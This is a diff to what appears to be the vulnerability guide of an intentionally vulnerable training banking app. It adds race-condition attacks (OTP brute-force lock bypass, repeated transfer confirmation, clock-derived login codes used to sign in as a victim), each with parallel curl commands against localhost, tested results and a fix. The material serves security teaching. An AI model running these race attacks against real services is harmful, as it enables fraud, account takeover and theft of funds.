@@ -41,7 +41,9 @@ Hidden secret in JS bundle: sk_live_NOVATRUST_DEBUG_4242424242424242
  [10]  Mass assignment — register w/ role=admin (A08, Ch 32)
  [11]  Mass assignment — API PUT /users/:id (Ch 32 API3)
  [12]  Prototype pollution — lodash.merge   (Ch 31)
- [13]  Race condition — balance overdraw (/transfer/send) + gift-card limit overrun (/rewards/redeem)  (Ch 21)
+ [13]  Race conditions (Ch 21): balance overdraw (/transfer/send) + gift-card limit overrun
+        (/rewards/redeem) + OTP rate-limit bypass (/security/verify) + multi-endpoint confirm
+        (/transfer/initiate,confirm) + time-sensitive login code (/login/code)
  [14]  No CSRF protection — GET transfer     (Ch 23)
  [15]  Clickjacking — no X-Frame-Options     (Ch 23)
  [16]  Open redirect — /go?u= and /login?next= (Ch 16)
@@ -513,6 +515,39 @@ MITIGATION
                WHERE code = ? AND redeemed = 0               (credit iff changes===1)
   Or wrap the sequence in a transaction with row locking (SELECT ... FOR UPDATE),
   an optimistic version column, or an app-level lock (Redis) across instances.
+
+MORE RACE SINKS (Ch 21) — all read-check-write with a real `await` gap:
+
+  [13b] OTP rate-limit bypass — POST /security/verify (routes/security.js)
+    A step-up code allows 5 wrong tries then locks. verify reads attempts,
+    checks < 5, awaits, then increments on a miss -> racing N guesses all pass
+    the gate before the counter catches up, so the lock never trips.
+      curl -s -b cookies http://localhost:3001/security/verify -o /dev/null   # mints a challenge
+      # then race wrong guesses (id from otp_challenges):
+      seq 30 | xargs -P30 -I{} curl -s -b cookies -o /dev/null \
+        -d "challenge_id=<id>&code=000000" http://localhost:3001/security/verify
+      # tested: attempts reached 10 (>5) -> the 5-try anti-brute-force is defeated.
+    FIX: UPDATE otp_challenges SET attempts=attempts+1 WHERE id=? AND attempts<5 (act on changes).
+
+  [13c] Multi-endpoint race — POST /transfer/initiate then race POST /transfer/confirm
+    A large transfer is staged (pending) then confirmed. confirm checks
+    status='pending', awaits, then debits + marks executed. Racing confirm
+    executes ONE authorised transfer many times.
+      # initiate returns /transfer/confirm/<id>; then:
+      seq 20 | xargs -P20 -I{} curl -s -b cookies -o /dev/null -d "id=<id>" \
+        http://localhost:3001/transfer/confirm
+      # tested: one $1,000 authorisation executed 5x -> $5,000 debited.
+    FIX: UPDATE pending_transfers SET status='executed' WHERE id=? AND status='pending' (debit iff changes===1).
+
+  [13d] Time-sensitive login code — POST /login/code/request (routes/passwordless.js)
+    The passwordless code = f(current second), so two requests in the same
+    second get the SAME code. Request a code for the victim AND yourself at the
+    same instant -> identical code -> sign in as the victim with the code sent
+    to YOUR inbox.
+      ( curl -s -d email=victim@... .../login/code/request &
+        curl -s -d email=attacker@... .../login/code/request & wait )
+      # tested: both codes were 596985 -> then POST /login/code/verify {victim,code}.
+    FIX: crypto.randomInt per account; never derive a secret from a clock.
 
 --------------------------------------------------------------------------------
  [14] No CSRF protection — GET transfer
